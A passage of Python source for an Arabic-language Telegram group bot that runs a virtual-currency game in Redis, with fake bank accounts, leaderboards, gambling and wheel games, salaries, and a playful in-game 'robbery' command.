        r.set(f'{m.from_user.id}:bankID', int(id))
        r.set(f'{m.from_user.id}:bankCard','بطاقة تموين')
        card = 'بطاقة تموين'
        r.sadd('BankList', m.from_user.id)
        r.set(f'{id}:getAccBank', m.from_user.id)
        fff = floos + floos_to_add
        r.set(f'{m.from_user.id}:Floos',fff)
        r.set(f'{m.from_user.id}:bankName',m.from_user.first_name)
        m.reply(f'• وسوينا لك حساب في بنك {text}\n\n{k} رقم حسابك ↢ ( `{id}` )\n{k} نوع البطاقة ↢ ( {card} )\n{k} فلوسك ↢ ( {fff} ريال 💸 )\n\n{k} هتدفع!! هتشوف الي مشفتهوش، دا لو هتدفع!، انما ببلاش دا انا معرفش حاجة اسمها ببلاش')
        if r.get(f'DevGroup:{Dev_Zaid}'):
          return c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),
           f' ⟨ {m.from_user.mention} ⟩\n{k} سوى حساب بالبنك\n{k} رقم حسابه ( `{id}` )')
        else:
          return 
     '''
     r.sadd('BankList', m.from_user.id)
     r.set(f'{id}:getAccBank', m.from_user.id)
     fff = floos + floos_to_add
     r.set(f'{m.from_user.id}:Floos',fff)
     r.set(f'{m.from_user.id}:bankName',m.from_user.first_name)
     m.reply(f'• وسوينا لك حساب في بنك {text}\n\n{k} رقم حسابك ↢ ( `{id}` )\n{k} نوع البطاقة ↢ ( {card} )\n{k} فلوسك ↢ ( {fff} ريال 💸 )')
     if r.get(f'DevGroup:{Dev_Zaid}'):
         c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),
           f' ⟨ {m.from_user.mention} ⟩\n{k} سوى حساب بالبنك\n{k} رقم حسابه ( `{id}` )')
   
   if text == 'توب' or text == 'التوب':
     m.reply(f'{k} اهلين فيك في قوائم التوب\nللاستفسار - @{channel}',
     reply_markup=InlineKeyboardMarkup (
       [
       [
         InlineKeyboardButton ('توب الفلوس 💸', callback_data=f'topfloos:{m.from_user.id}'),
         InlineKeyboardButton ('توب الحرامية 💰', callback_data=f'topzrf:{m.from_user.id}'),
       ],
       [
        InlineKeyboardButton ('🧚‍♀️',url=f't.me/{channel}')
       ]
       ]
     ))
   
   if text == 'توب الفلوس':
     if not r.smembers('BankList'):
       return m.reply(f'{k} مافيه حسابات بالبنك')
     else:
       rep = InlineKeyboardMarkup (
         [[InlineKeyboardButton ('🧚‍♀️', url=f't.me/{channel}')]]
       )
       if r.get('BankTop'):
          text = r.get('BankTop')
          if not r.get(f'{m.from_user.id}:Floos'):
            floos = 0
          else:
            floos = int(r.get(f'{m.from_user.id}:Floos'))
          get = r.ttl('BankTop')
          wait = time.strftime('%M:%S', time.gmtime(get))
          text += '\n━━━━━━━━━'
          text += f'\n# You ) {floos:,} 💸 l {m.from_user.first_name}'
          text += f'\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)'
          text += f'\n\nالقائمة تتحدث بعد {wait} دقيقة'
          return m.reply(text, disable_web_page_preview=True,reply_markup=rep)
       else:
          users = []
          ccc = 0
          for user in r.smembers('BankList'):
            ccc += 1
            id = int(user)
            if r.get(f'{id}:bankName'):
              name = r.get(f'{id}:bankName')[:10]
            else:
              try:
                name = c.get_chat(id).first_name
                r.set(f'{id}:bankName',name)
              except:
                name = 'INVALID_NAME'
                r.set(f'{id}:bankName',name)
            if not r.get(f'{id}:Floos'):
              floos = 0
            else:
              floos = int(r.get(f'{id}:Floos'))
            users.append({'name':name, 'money':floos})
          top = get_top(users)
          text = 'توب 20 اغنى اشخاص:\n\n'
          count = 0
          for user in top:
            count += 1
            if count == 21:
              break 
            emoji = get_emoji_bank(count)
            floos = user['money']
            name = user ['name']
            text += f'**{emoji}{floos:,}** 💸 l {name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}\n'
          r.set('BankTop',text,ex=300)
          if not r.get(f'{m.from_user.id}:Floos'):
            floos_from_user = 0
          else:
            floos_from_user = int(r.get(f'{m.from_user.id}:Floos'))
          text += '\n━━━━━━━━━'
          text += f'\n# You ) {floos_from_user:,} 💸 l {m.from_user.first_name}'
          text += f'\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)'
          get = r.ttl('BankTop')
          wait = time.strftime('%M:%S', time.gmtime(get))
          text += f'\n\nالقائمة تتحدث بعد {wait} دقيقة'
          return m.reply(text,disable_web_page_preview=True,reply_markup=rep)
   
   
   if text == 'توب الحراميه' or text == 'توب الحرامية' or text == 'توب الزرف':
     if not r.smembers('BankList'):
       return m.reply(f'{k} مافيه حسابات بالبنك')
     else:
       rep = InlineKeyboardMarkup (
         [[InlineKeyboardButton ('🧚‍♀️', url=f't.me/{channel}')]]
       )
       if r.get('BankTopZRF'):
          text = r.get('BankTopZRF')
          if not r.get(f'{m.from_user.id}:Zrf'):
            zrf = 0
          else:
            zrf = int(r.get(f'{m.from_user.id}:Zrf'))
          get = r.ttl('BankTopZRF')
          wait = time.strftime('%M:%S', time.gmtime(get))
          text += '\n━━━━━━━━━'
          text += f'\n# You ) {zrf:,} 💰 l {m.from_user.first_name}'
          text += f'\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)'
          text += f'\n\nالقائمة تتحدث بعد {wait} دقيقة'
          return m.reply(text, disable_web_page_preview=True,reply_markup=rep)
       else:
          users = []
          ccc = 0
          for user in r.smembers('BankList'):
            ccc += 1
            id = int(user)
            if r.get(f'{id}:bankName'):
              name = r.get(f'{id}:bankName')[:10]
            else:
              try:
                name = c.get_chat(id).first_name
                r.set(f'{id}:bankName',name)
              except:
                name = 'INVALID_NAME'
                r.set(f'{id}:bankName',name)
            if not r.get(f'{id}:Zrf'):
              zrf = 0
            else:
              zrf = int(r.get(f'{id}:Zrf'))
            users.append({'name':name, 'money':zrf})
          top = get_top(users)
          text = 'توب 20 اكثر الحراميه زرفًا:\n\n'
          count = 0
          for user in top:
            count += 1
            if count == 21:
              break 
            emoji = get_emoji_bank(count)
            floos = user['money']
            name = user ['name']
            text += f'**{emoji}{floos:,}** 💰 l⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮{name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}\n'
          r.set('BankTopZRF',text,ex=300)
          if not r.get(f'{m.from_user.id}:Zrf'):
            floos_from_user = 0
          else:
            floos_from_user = int(r.get(f'{m.from_user.id}:Zrf'))
          text += '\n━━━━━━━━━'
          text += f'\n# You ) {floos_from_user:,} 💰 l {m.from_user.first_name}'
          text += f'\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)'
          get = r.ttl('BankTopZRF')
          wait = time.strftime('%M:%S', time.gmtime(get))
          text += f'\n\nالقائمة تتحدث بعد {wait} دقيقة'
          m.reply(text,disable_web_page_preview=True,reply_markup=rep)
   
   if text == 'زواجات' or text == 'توب زواجات' or text == 'توب الزواجات':
     if not r.smembers(f'{m.chat.id}:zwag:{Dev_Zaid}'):
        return m.reply(f'{k} محد متزوج بالقروب')
     else:
        #r.sadd(f'{m.chat.id}:zwag:{Dev_Zaid}', f'{m.reply_to_message.from_user.id}--{m.from_user.id}&&floos={floos}')
        users = []
        ccc = 0
        for marriage in r.smembers(f'{m.chat.id}:zwag:{Dev_Zaid}'):
           user_id_1 = int(marriage.split('--')[0])
           user_id_2 = int(marriage.split('--')[1].split('&&')[0])
           money = int(marriage.split('&&floos=')[1])
           ccc += 1
           if r.get(f'{user_id_1}:bankName'):
              name_1 = r.get(f'{user_id_1}:bankName')[:10]
           else:
              try:
                name_1 = c.get_chat(id).first_name[:10]
                r.set(f'{user_id_1}:bankName',name_1)
              except:
                name_1 = 'INVALID_NAME'
                r.set(f'{user_id_1}:bankName',name_1)
           if r.get(f'{user_id_2}:bankName'):
              name_2 = r.get(f'{user_id_2}:bankName')[:10]
           else:
              try:
                name_2 = c.get_chat(id).first_name[:10]
                r.set(f'{user_id_2}:bankName',name_2)
              except:
                name_2 = 'INVALID_NAME'
                r.set(f'{user_id_2}:bankName',name_2)
           users.append({'name_1':name_1, 'name_2':name_2,'money':money})
        top = get_top(users)
        text = 'توب 20 اغلى زواجات بالقروب:\n\n'
        count = 0
        for user in top:
          count += 1
          if count == 21:
            break 
          emoji = get_emoji_bank(count)
          money = user['money']
          name_1 = user['name_1']
          name_2 = user['name_2']
          text += f'**{emoji}**👫 ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮{name_1} 💕 {name_2} |\n**💸 {money:,}**\n'
        text += f'\n\n[قوانين التُوب](https://t.me/{botUsername}?start=rules)'
        return m.reply(text, disable_web_page_preview=True)
           
   
   '''
   if text == 'تصفير التوب':
     if devp_pls(m.from_user.id,m.chat.id):
       if not r.get('BankTop'):
         return m.reply('اكتب توب الفلوس وارجع حاول')
       if not r.get('BankTopZRF'):
         return m.reply('اكتب توب الحراميه وارجع حاول')
       else:
         m.reply(f'{k} ابشر صفرت التوب')
         users = []
         ccc = 0
         for user in r.smembers('BankList'):
            ccc += 1
            id = int(user)
            if r.get(f'{id}:bankName'):
              name = r.get(f'{id}:bankName')[:10]
            else:
              try:
                name = c.get_chat(id).first_name
                r.set(f'{id}:bankName',name)
              except:
                name = 'INVALID_NAME'
                r.set(f'{id}:bankName',name)
            if not r.get(f'{id}:Zrf'):
              zrf = 0
            else:
              zrf = int(r.get(f'{id}:Zrf'))
            users.append({'name':name, 'money':zrf})
         top = get_top(users)
         text = ''
         count = 0
         for user in top:
            count += 1
            if count == 3:
              break 
            emoji = get_emoji_bank(count)
            floos = user['money']
            name = user ['name']
            text += f'{emoji}{floos} 💰 l {name}\n'
         r.set(f'BankTopLastZrf',text)
         users = []
         ccc = 0
         for user in r.smembers('BankList'):
            ccc += 1
            id = int(user)
            if r.get(f'{id}:bankName'):
              name = r.get(f'{id}:bankName')[:10]
            else:
              try:
                name = c.get_chat(id).first_name
                r.set(f'{id}:bankName',name)
              except:
                name = 'INVALID_NAME'
                r.set(f'{id}:bankName',name)
            if not r.get(f'{id}:Floos'):
              floos = 0
            else:
              floos = int(r.get(f'{id}:Floos'))
         users.append({'name':name, 'money':floos})
         top = get_top(users)
         text = ''
         count = 0
         for user in top:
            count += 1
            if count == 3:
              break 
            emoji = get_emoji_bank(count)
            floos = user['money']
            name = user ['name']
            text += f'**{emoji}{floos}** 💸 l {name}\n'
         r.set(f'BankTopLast',text)
         keys = r.keys('*:Floos')
         for a in keys:
           r.delete(a)
   '''
   
   if text == 'حسابي':
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     else:
       card = r.get(f'{m.from_user.id}:bankCard')
       id = int(r.get(f'{m.from_user.id}:bankID'))
       bank = r.get(f'{m.from_user.id}:bankType')
       if not r.get(f'{m.from_user.id}:Floos'):
         floos = 0
       else:
         floos = int(r.get(f'{m.from_user.id}:Floos'))
       if r.get(f'{m.from_user.id}:bankName'):
         name = r.get(f'{m.from_user.id}:bankName')
       else:
         name = m.from_user.first_name
       m.reply(f'''{k} الاسم ↢ ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮{name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
{k} الحساب ↢ `{id}`
{k} بنك ↢ ( {bank} )
{k} نوع ↢ ( {card} )
{k} الرصيد ↢ ( {floos} ريال 💸 )
☆''')
   
   if text == 'انشاء حساب بنكي':
     if r.sismember('BankList', m.from_user.id):
       bank = r.get(f'{m.from_user.id}:bankType')
       acc_id = int(r.get(f'{m.from_user.id}:bankID'))
       return m.reply(f'{k} عندك حساب في بنك {bank}\n\n{k} لتفاصيل اكثر اكتب\n{k} `حساب {acc_id}`')
     else:
       r.set(f'{m.from_user.id}:createBank:{m.chat.id}',1,ex=300)
       '''
       return m.reply(f'– عشان تسوي حساب لازم تختار بنك\n\n{k} `الاهلي`\n{k} `راجحي`\n{k} `الانماء`\n{k} `عبد الفتاح السيسي`\n\n- اضغط للنسخ')
       '''
       return m.reply(f'– عشان تسوي حساب لازم تختار بنك\n\n{k} `الاهلي`\n{k} `راجحي`\n{k} `الانماء`\n\n- اضغط للنسخ')
       
   
   if text == 'مسح حسابي':
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي')
     else:
       r.srem('BankList', m.from_user.id)
       m.reply(f'{k} تم حذف حسابك البنكي')
   
   if text.startswith('حساب ') and len(text.split()) == 2 and re.findall('[0-9]+', text):
      acc_id = int(re.findall('[0-9]+', text)[0])
      if r.get(f'{acc_id}:getAccBank'):
         id = int(r.get(f'{acc_id}:getAccBank'))
         if r.get(f'{id}:bankName'):
           name = r.get(f'{id}:bankName')[:10]
         else:
           gett = c.get_users(int(r.get(f'{acc_id}:getAccBank')))
           name = gett.first_name
           r.set(f'{id}:bankName',name)
         bank = r.get(f'{id}:bankType')
         card = r.get(f'{id}:bankCard')
         if not r.get(f'{id}:Floos'):
           floos = 0
         else:
           floos = int(r.get(f'{id}:Floos'))
         m.reply(f'''
{k} الاسم ↢ ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮{name.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","")}
{k} الحساب ↢ `{acc_id}`
{k} بنك ↢ ( {bank} )
{k} نوع ↢ ( {card} )
{k} الرصيد ↢ ( `{floos}` ريال 💸 )
☆
''')
   
   if text.startswith('تحويل ') and len(text.split()) == 2 and re.findall('[0-9]+', text):
      floos_to_trans = int(re.findall('[0-9]+', text)[0])
      if not r.get(f'{m.from_user.id}:Floos'):
        floos = 0
      else:
        floos = int(r.get(f'{m.from_user.id}:Floos'))
      if floos_to_trans < 200:
        return m.reply(f'{k} الحد الادنى المسموح هو 200 ريال')
      else:
        if floos_to_trans > floos:
          return m.reply(f'{k} فلوسك ماتكفي')
        if not r.sismember('BankList', m.from_user.id):
          return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
        else:
          r.set(f'{m.from_user.id}:toTrans:{m.chat.id}{Dev_Zaid}',floos_to_trans, ex=600)
          return m.reply(f'{k} ارسل الحين رقم حساب البنكي الي تبي تحول له')
   
      
      
   if text.startswith('حظ ') and len(text.split()) == 2 and re.findall('[0-9]+', text):
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if r.get(f'{m.from_user.id}:BankWaitHZ'):
       get = r.ttl(f'{m.from_user.id}:BankWaitHZ')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} مايمديك تلعب لعبة الحظ الحين ! \n{k} تعال بعد {wait} دقيقة')
     else:
       if not r.get(f'{m.from_user.id}:Floos'):
         floos = 0
       else:
         floos = int(r.get(f'{m.from_user.id}:Floos'))
       floos_to_hz = int(re.findall('[0-9]+', text)[0])
       if floos_to_hz == 0:
         return m.reply(f'{k} مايمدي تلعب بالصفر')
       if floos_to_hz > floos:
         return m.reply(f'{k} فلوسك ماتكفي')
       else:
         r.set(f'{m.from_user.id}:BankWaitHZ',1,ex=600)
         hzz = random.choice(['yes','no'])
         if hzz == 'yes':
           fls = floos_to_hz
           floos_com = floos+fls
           r.set(f'{m.from_user.id}:Floos', floos+fls)
           return m.reply(f'{k} مبروك فزت بالحظ !\n{k} فلوسك قبل ↢ ( **{floos}** ريال 💸 )\n{k} فلوسك الحين ↢ ( **{floos_com}** ريال 💸 )')
         else:
           fls = floos-floos_to_hz
           if fls == 0:
              r.delete(f'{m.from_user.id}:Floos')
           else:
              r.set(f'{m.from_user.id}:Floos', fls)
           return m.reply(f'{k} للأسف خسرت بالحظ !\n{k} فلوسك قبل ↢ ( **{floos}** ريال 💸 )\n{k} فلوسك الحين ↢ ( **{fls}** ريال 💸 )')
   
   
   if text == "حظ فلوسي":
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if r.get(f'{m.from_user.id}:BankWaitHZ'):
       get = r.ttl(f'{m.from_user.id}:BankWaitHZ')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} مايمديك تلعب لعبة الحظ الحين ! \n{k} تعال بعد {wait} دقيقة')
     else:
       if not r.get(f'{m.from_user.id}:Floos'):
         floos = 0
       else:
         floos = int(r.get(f'{m.from_user.id}:Floos'))
       floos_to_hz = floos
       if floos_to_hz == 0:
         return m.reply(f'{k} مايمدي تلعب بالصفر')
       else:
         r.set(f'{m.from_user.id}:BankWaitHZ',1,ex=600)
         hzz = random.choice(['yes','no'])
         if hzz == 'yes':
           fls = floos_to_hz
           floos_com = floos+fls
           r.set(f'{m.from_user.id}:Floos', floos+fls)
           return m.reply(f'{k} مبروك فزت بالحظ !\n{k} فلوسك قبل ↢ ( **{floos}** ريال 💸 )\n{k} فلوسك الحين ↢ ( **{floos_com}** ريال 💸 )')
         else:
           fls = floos-floos_to_hz
           if fls == 0:
              r.delete(f'{m.from_user.id}:Floos')
           else:
              r.set(f'{m.from_user.id}:Floos', fls)
           return m.reply(f'{k} للأسف خسرت بالحظ !\n{k} فلوسك قبل ↢ ( "**{floos}** ريال 💸 )\n{k} فلوسك الحين ↢ ( **{fls}** ريال 💸 )')

   if text == 'عجله' or text == 'عجلة':
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     else:
       if r.get(f'{m.from_user.id}:BankWait3JL'):
         get = r.ttl(f'{m.from_user.id}:BankWait3JL')
         wait = time.strftime('%M:%S', time.gmtime(get))
         return m.reply(f'{k} مايمديك تلعب عجلة الحين ! \n{k} تعال بعد {wait} دقيقة')
       else:
         r.set(f'{m.from_user.id}:BankWait3JL',1,ex=300)
         rep = m.reply(f'{k} حلف العجلة بعد ٣ ثواني',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('³',callback_data='None')]]))
         time.sleep(1)
         rep.edit_text(f'{k} حلف العجلة بعد ثانيتين',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('²',callback_data='None')]]))
         time.sleep(1)
         rep.edit_text(f'{k} حلف العجلة بعد ثانية',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('¹',callback_data='None')]]))
         time.sleep(1)
         emojis_3jl = [
         '💸','💸','💸','💸','💸','💸','💸',
         '💸','💸','💸','💸','💸','💸','💸',
         '⚡','⚡','⚡','⚡','⚡','⚡','⚡',
         '⚡','⚡','⚡','⚡','⚡','⚡','⚡',
         '💣','💣','💣','💣','💣','💣','💣',
         '💣','💣','💣','💣','💣','💣','💣',
         '🍒','🍒','🍒','🍒','🍒','🍒','🍒',
         '🍒','🍒','🍒','🍒','🍒','🍒','🍒',
         '💎','💎','💎','💎','💎','💎','💎',
         '💎','💎','💎','💎','💎','💎','💎'
         ]
         emoji1 = random.choice(emojis_3jl)
         emoji2 = random.choice(emojis_3jl)
         emoji3 = random.choice(emojis_3jl)
         reply_ma = InlineKeyboardMarkup (
           [
             [
               InlineKeyboardButton (emoji1, callback_data='None'),
               InlineKeyboardButton (emoji2, callback_data='None'),
               InlineKeyboardButton (emoji3, callback_data='None'),
             ],
             [
               InlineKeyboardButton ('🫦', url=f't.me/{channel}')
             ]
           ]
         )
         if emoji1 == emoji2 and emoji2 == emoji3:
            chance = random.choice([100000, 200000, 300000])
            if not r.get(f'{m.from_user.id}:Floos'):
              floos = 0
            else:
              floos = int(r.get(f'{m.from_user.id}:Floos'))
            rep.edit_text(f'{k} فزت بعجلة الحظ!\n\n{k} مبلغ الربح ( {chance} ريال 💸 )\n{k} فلوسك قبل ( `{floos}` ريال 💸 )\n{k} فلوسك الحين ( `{floos+chance}` ريال 💸 )',reply_markup=reply_ma)
            r.set(f'{m.from_user.id}:Floos', floos+chance)
         else:
            chance = random.randint(100,1000)
            if not r.get(f'{m.from_user.id}:Floos'):
              floos = 0
            else:
              floos = int(r.get(f'{m.from_user.id}:Floos'))
            rep.edit_text(f'{k} للأسف خسرت بعجلة الحظ!\n\n{k} خذ {chance} ريال عشان ماتصيح\n{k} فلوسك قبل ( `{floos}` ريال 💸 )\n{k} فلوسك الحين ( `{floos+chance}` ريال 💸 )',reply_markup=reply_ma)
            r.set(f'{m.from_user.id}:Floos', floos+chance)
           
   if text.startswith('استثمار ') and len(text.split()) == 2 and re.findall('[0-9]+', text):
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if r.get(f'{m.from_user.id}:BankWaitEST'):
       get = r.ttl(f'{m.from_user.id}:BankWaitEST')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} مايمديك تستثمر الحين ! \n{k} تعال بعد {wait} دقيقة')
     else:
       if not r.get(f'{m.from_user.id}:Floos'):
         floos = 0
       else:
         floos = int(r.get(f'{m.from_user.id}:Floos'))
       floos_to_est = int(re.findall('[0-9]+', text)[0])
       if floos_to_est == 0:
         return m.reply(f'{k} مايمدي تلعب بالصفر')
       if floos_to_est > floos:
         return m.reply(f'{k} فلوسك ماتكفي')
       if floos_to_est < 2000:
         return m.reply(f'{k} للأسف لازم تستثمر ب 2000 ريال عالأقل')
       else:
         r.set(f'{m.from_user.id}:BankWaitEST',1,ex=300)
         one = int(floos_to_est/random.randint(1,9))
         rb7 = int(is_what_percent_of(one,floos_to_est))
         r.set(f'{m.from_user.id}:Floos',floos+one)
         m.reply(f'''
{k}  استثمار ناجح!
{k} نسبة الربح ↢ {rb7}%
{k} مبلغ الربح ↢ ( `{one}` ريال )
{k} فلوسك صارت ↢ ( `{floos+one}` ريال 💸 )
''')
   
   if text == "استثمار فلوسي":
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if r.get(f'{m.from_user.id}:BankWaitEST'):
       get = r.ttl(f'{m.from_user.id}:BankWaitEST')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} مايمديك تستثمر الحين ! \n{k} تعال بعد {wait} دقيقة')
     else:
       if not r.get(f'{m.from_user.id}:Floos'):
         floos = 0
       else:
         floos = int(r.get(f'{m.from_user.id}:Floos'))
       floos_to_est = floos
       if floos_to_est == 0:
         return m.reply(f'{k} مايمدي تستثمر بالصفر')
       if floos_to_est < 2000:
         return m.reply(f'{k} للأسف لازم تستثمر ب 2000 ريال عالأقل')
       else:
         r.set(f'{m.from_user.id}:BankWaitEST',1,ex=300)
         one = int(floos_to_est/random.randint(1,9))
         rb7 = int(is_what_percent_of(one,floos_to_est))
         r.set(f'{m.from_user.id}:Floos',floos+one)
         m.reply(f'''
{k}  استثمار ناجح!
{k} نسبة الربح ↢ {rb7}%
{k} مبلغ الربح ↢ ( `{one}` ريال )
{k} فلوسك صارت ↢ ( `{floos+one}` ريال 💸 )
''')
   
   if text == 'كنز':
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if r.get(f'{m.from_user.id}:BankWaitKNZ'):
       get = r.ttl(f'{m.from_user.id}:BankWaitKNZ')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} كنزك بينزل بعد {wait} دقيقة')
     else:
       if not r.get(f'{m.from_user.id}:Floos'):
          floos = 0
       else:
          floos = int(r.get(f'{m.from_user.id}:Floos'))
       knz = random.choice(knzs)
       money = knz['credit']
       name = knz['name']
       r.set(f'{m.from_user.id}:BankWaitKNZ',1, ex=600)
       r.set(f'{m.from_user.id}:Floos', floos+money)
       fls = floos+money
       return m.reply(f'اشعار ايداع {m.from_user.mention(m.from_user.first_name[:10])}⁪⁬⁪⁬⁮⁪⁬⁪\nالمبلغ: **{money}** ريال\nالكنز: {name}\nنوع العملية: ربح كنز\nرصيدك الحين: **{fls}** ريال 💸')

   if text == 'بخشيش':
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if r.get(f'{m.from_user.id}:BankWaitB5'):
       get = r.ttl(f'{m.from_user.id}:BankWaitB5')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} مايمدي اعطيك بخشيش الحين\n{k} تعال بعد {wait} دقيقة')
     else:
       b5 = random.randint(5,1000)
       r.set(f'{m.from_user.id}:BankWaitB5',1, ex=300)
       if not r.get(f'{m.from_user.id}:Floos'):
          floos = 0
       else:
          floos = int(r.get(f'{m.from_user.id}:Floos'))
       r.set(f'{m.from_user.id}:Floos', floos+b5)
       m.reply(f'{k} دلعتك وعطيتك {b5} ريال 💸')
       
   if text == 'راتب':
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if r.get(f'{m.from_user.id}:BankWait'):
       get = r.ttl(f'{m.from_user.id}:BankWait')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} راتبك بينزل بعد {wait} دقيقة')
     else:
       job = random.choice(jobs)
       money = job['credit']
       name = job['name']
       r.set(f'{m.from_user.id}:BankWait',1, ex=300)
       if not r.get(f'{m.from_user.id}:Floos'):
          floos = 0
       else:
          floos = int(r.get(f'{m.from_user.id}:Floos'))
       r.set(f'{m.from_user.id}:Floos', floos+money)
       fls = floos+money
       m.reply(f'اشعار ايداع⁪⁬⁪⁬⁮⁪⁬⁪ {m.from_user.mention(m.from_user.first_name[:10])}\nالمبلغ: **{money}** ريال\nوظيفتك: {name}\nنوع العملية: اضافة راتب\nرصيدك الحين: **{fls}** ريال 💸')
   
   if text == 'زرف' and m.reply_to_message and m.reply_to_message.from_user:
     if m.reply_to_message.from_user.id == int(Dev_Zaid):
       return m.reply('?')
     if not r.sismember('BankList', m.from_user.id):
       return m.reply(f'{k} ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )')
     if not r.sismember('BankList', m.reply_to_message.from_user.id):
       return m.reply(f'{k} ماعنده حساب بنكي')
     if m.reply_to_message.from_user.id == m.from_user.id:
       return m.reply('تبي تزرف نفسك؟')
     if r.get(f'{m.from_user.id}:BankWaitZRF'):
       get = r.ttl(f'{m.from_user.id}:BankWaitZRF')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} يولد انحش الشرطة للحين تدور عنك\n{k} يمديك تزرف مره ثانيه بعد {wait}')
     if r.get(f'{m.reply_to_message.from_user.id}:BankWaitMZROF'):
       get = r.ttl(f'{m.reply_to_message.from_user.id}:BankWaitMZROF')
       wait = time.strftime('%M:%S', time.gmtime(get))
       return m.reply(f'{k} ذا المسكين مزروف قبل شوي\n{k} يمديك تزرفه بعد {wait}')
     if not r.get(f'{m.reply_to_message.from_user.id}:Floos'):
       return m.reply(f'{k} مطفر مامعه ولا ريال')
     if int(r.get(f'{m.reply_to_message.from_user.id}:Floos')) < 2000:
       return m.reply(f'{k} مايمديك تزرفه لان فلوسه اقل من 2000 ريال')
     else:
       zrf = random.randint(50,1000)
       r.set(f'{m.from_user.id}:BankWaitZRF',1,ex=300)
       r.set(f'{m.reply_to_message.from_user.id}:BankWaitMZROF',1,ex=300)
       floos = int(r.get(f'{m.reply_to_message.from_user.id}:Floos'))
       r.set(f'{m.reply_to_message.from_user.id}:Floos',floos-zrf)
       m.reply(f'{k} خذ يالحرامي زرفته {zrf} ريال 💸')
       if not r.get(f'{m.from_user.id}:Floos'):
         floos_from_user = 0
       else:
         floos_from_user = int(r.get(f'{m.from_user.id}:Floos'))
       r.set(f'{m.from_user.id}:Floos',floos_from_user+zrf)
       r.sadd('BankZrf',m.from_user.id)
       if r.get(f'{m.from_user.id}:Zrf'):
          zrff = int(r.get(f'{m.from_user.id}:Zrf'))
       else:
          zrff = 0
       r.set(f'{m.from_user.id}:Zrf',zrff+zrf)
       try:
         c.send_message(
           m.reply_to_message.from_user.id,
           f'الحق الحق حلالك!!\nذا الحرامي {m.from_user.mention}\nسرق منك ( {zrf} ريال 💸 )\n༄',
           reply_markup=InlineKeyboardMarkup (
             [[
               InlineKeyboardButton (m.chat.title, url=m.link)
             ]]
           )
           )
       except:
         pass
       
  
   if text == 'تصفير البنك':
     if devp_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} متأكد تبي تصفر البنك ؟',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('اي', callback_data='yes:del:bank')],[InlineKeyboardButton ('لا', callback_data='no:del:bank')]]))
   
   if text == 'فلوسي':
     if not r.get(f'{m.from_user.id}:Floos'):
        m.reply(f'{k} ماعندك فلوس ارسل الالعاب وابدا جمع الفلوس')
     else:
        floos = int(r.get(f'{m.from_user.id}:Floos'))
        return m.reply(f'{k} فلوسك `{floos}` ريال 💸')
   
   if text == 'فلوس':
     if not m.reply_to_message:
       if not r.get(f'{m.from_user.id}:Floos'):
         return m.reply(f'{k} ماعندك فلوس ارسل الالعاب وابدا جمع الفلوس')
       else:
         floos = int(r.get(f'{m.from_user.id}:Floos'))
       return m.reply(f'{k} فلوسك `{floos}` ريال 💸')
     else:
       if not r.get(f'{m.reply_to_message.from_user.id}:Floos'):
         floos = 0
       else:
         floos = int(r.get(f'{m.reply_to_message.from_user.id}:Floos'))
       return m.reply(f'{k} فلوسه ↢ ( {floos} ريال 💸 )')
   
   if text.startswith('بيع فلوسي ') and len(text.split()) == 3 and re.findall('[0-9]+', text):
     if not r.get(f'{m.from_user.id}:Floos'):
        m.reply(f'{k} للاسف انت مطفر عندك 0 ريال')
     else:
        floos_to_sale = int(re.findall('[0-9]+', text)[0])
        floos = int(r.get(f'{m.from_user.id}:Floos'))
        if floos_to_sale == 0:
